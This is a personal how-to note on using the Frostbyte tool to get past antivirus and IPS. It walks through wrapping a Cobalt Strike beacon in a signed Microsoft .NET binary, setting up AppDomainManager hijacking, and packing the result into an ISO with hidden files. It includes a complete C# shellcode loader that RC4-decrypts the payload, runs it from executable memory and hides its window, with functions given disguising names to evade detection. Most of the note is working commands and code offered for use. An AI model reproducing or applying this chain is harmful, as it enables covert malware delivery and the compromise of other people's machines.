---
creation date: November 15th 2022
last modified date: November 15th 2022
aliases: []
tags: #🧰
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🧰  

# [[Frostbyte]]  
___

## Description:

Anti-virus and IPS evasion


## Installation

https://github.com/pwn1sher/frostbyte



## Commands

Go into CobaltStrike. Go to Payloads, windows stateless payload, and change the output to raw. Save that as a .bin file.

Get a clone of frostbyte on a windows machine. 

Find a windows executable that has a .exe.config in `C:\Windows\Microsoft.NET\Framework64\v4.0.30319` (for example dfsvc.exe). Copy it to your frostbyte folder. Make sure it's x64 (can check with sigcheck.exe filename).


Run the following command to get a windows signed binary (you can change the name of “updater”). Make sure to change the password.

  
```

./SigFlip.exe -i "C:\Users\Administrator\Desktop\frostbyte-main\dfsvc.exe" "C:\Users\Administrator\Desktop\frostbyte-main\beacon64.bin" "C:\Users\Administrator\Desktop\frostbyte-main\updater.exe" "passcode"

```
  

Open updater.exe.config and change the value of updater and A54IPK. Change the value of privatePath to a relative path (using . should work fine):


```  

              <probing privatePath="."/>

      </assemblyBinding>

  <appDomainManagerAssembly value="updater, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null" />  

  <appDomainManagerType value="A54IPK" />  

   </runtime>

 ``` 

Open test.cs in visual studio code

Remove all comments and debug lines.

Change the value of “public sealed class A54IPK” to match you config file

Change the value of the below two lines to match the location of your exe (don't use an absolute path! Has to be a relative path.) and the passcode used to create it:


```  

byte[] _peBlob = Read("updater.exe");

byte[] _data = FindRecipe(shellcode, “passcode”);
```

  
At this point you can compile the .dll to see if everything is working (run the exe and see if you get a payload).


```
C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:updater.dll ..\frostbyte-main\test.cs

```
  

After you get a beacon back go back into test.cs and add the following lines to hid the window after it runs.

https://stackoverflow.com/questions/3571627/show-hide-the-console-window-of-a-c-sharp-console-application#:~:text=hid%22%3B%20HideConsole.-,StartInfo.,window%20when%20it%20is%20ran.

  

```
using System.Runtime.InteropServices;

  

[DllImport("kernel32.dll")]

static extern IntPtr GetConsoleWindow();

  

[DllImport("user32.dll")]

static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

  

const int SW_HIDE = 0;

const int SW_SHOW = 5;

  

var handle = GetConsoleWindow();

  

// Hide

ShowWindow(handle, SW_HIDE);

  

// Show

ShowWindow(handle, SW_SHOW);


```  

  
Finally, do a find and replace on all of the functions. They can be changed to anything random. The final code should look like the example posted at the bottom. Build the solution and put the payload into an iso.


```
C:\windows\Microsoft.NET\Framework\v3.5\csc.exe /target:library /out:updater.dll ..\frostbyte-main\test.cs

```
  

### PackMyPayload

https://github.com/mgeeky/PackMyPayload

Copy your .dll, .exe, and your config file to a different folder.


Run the following command to create the iso file with the .ddl and config file hidden.

```
./PackMyPayload.py --hide updater.dll,updater.exe.config iUpdater updater.iso -v
```

Mount the iso and run the exe. You should get a beacon in cobalt strike.

### Example code

```
using System;
using System.IO;
using System.EnterpriseServices;
using System.Runtime.InteropServices;

public sealed class A54IPK : AppDomainManager
{
    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {
		bool res = LunchMenu.DeliverPizza();
        return;
    }
}

public class LunchMenu 
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetConsoleWindow();

    [DllImport("user32.dll")]
    static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    
	[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(UInt32 lpStartAddr, UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
	
	[DllImport("kernel32")]
	private static extern IntPtr CreateThread(            
	UInt32 lpThreadAttributes,
	UInt32 dwStackSize,
	IntPtr lpStartAddress,
	IntPtr param,
	UInt32 dwCreationFlags,
	ref UInt32 lpThreadId           
	);
	   
    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, int dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        
    public static byte[] _tag = { 0xfe, 0xed, 0xfa, 0xce, 0xfe, 0xed, 0xfa, 0xce };
    public static byte[] Read(string filePath)
        {
            using (FileStream stream = new FileStream(filePath, FileMode.Open, FileAccess.Read))
            {
                byte[] rawData = new byte[stream.Length];
                stream.Read(rawData, 0, (int)stream.Length);
                stream.Close();

                return rawData;
            }
        }

    const int SW_HIDE = 0;
    const int SW_SHOW = 5;

  public static byte[] FindRecipe(byte[] data, string encKey)
        {
            byte[] T = new byte[256];
            byte[] S = new byte[256];
            int keyLen = encKey.Length;
            int dataLen = data.Length;
            byte[] result = new byte[dataLen];
            byte tmp;
            int j = 0, t = 0, i = 0;


            for (i = 0; i < 256; i++)
            {
                S[i] = Convert.ToByte(i);
                T[i] = Convert.ToByte(encKey[i % keyLen]);
            }

            for (i = 0; i < 256; i++)
            {
                j = (j + S[i] + T[i]) % 256;
                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;
            }
            j = 0;
            for (int x = 0; x < dataLen; x++)
            {
                i = (i + 1) % 256;
                j = (j + S[i]) % 256;

                tmp = S[j];
                S[j] = S[i];
                S[i] = tmp;

                t = (S[i] + S[j]) % 256;

                result[x] = Convert.ToByte(data[x] ^ S[t]);
            }

            return result;
        }

    public static int addToppings(byte[] _peBytes, byte[] pattern)
        {
            int _max = _peBytes.Length - pattern.Length + 1;
            int j;
            for (int i = 0; i < _max; i++) {
                if (_peBytes[i] != pattern[0]) continue;
                for (j = pattern.Length - 1; j >= 1 && _peBytes[i + j] == pattern[j]; j--) ;
                if (j == 0) return i;
            }
            return -1;
        }


    public static void DispatchDeliveryService(byte[] shellcode)
        {
            uint threadId;

            IntPtr alloc = VirtualAlloc(IntPtr.Zero, shellcode.Length, 0x1000 | 0x2000, 0x40);
            if (alloc == IntPtr.Zero)
            {
                return;
            }

            Marshal.Copy(shellcode, 0, alloc, shellcode.Length);
            IntPtr threadHandle = CreateThread(IntPtr.Zero, 0, alloc, IntPtr.Zero, 0, out threadId);
            WaitForSingleObject(threadHandle, 0xFFFFFFFF);
        }

    public static void WriteFile(string filename, byte[] rawData)
        {
            FileStream fs = new FileStream(filename, FileMode.OpenOrCreate);
            fs.Write(rawData, 0, rawData.Length);
            fs.Close();
        }

	public static bool DeliverPizza()
	{
        byte[] _peBlob = Read("updater.exe");
        int _dataOffset = addToppings(_peBlob, _tag);

        Stream stream = new MemoryStream(_peBlob);
        long pos = stream.Seek(_dataOffset + _tag.Length, SeekOrigin.Begin);

        byte[] shellcode = new byte[_peBlob.Length+2 - (pos + _tag.Length)];
        stream.Read(shellcode, 0, (_peBlob.Length+2) - ((int)pos + _tag.Length));
        byte[] _data = FindRecipe(shellcode, "rva2520");
        stream.Close();

        var handle = GetConsoleWindow();
        ShowWindow(handle, SW_HIDE);
        DispatchDeliveryService(_data);

        return true;
	} 
}

```


___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: November 15th 2022 (09:21 am)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
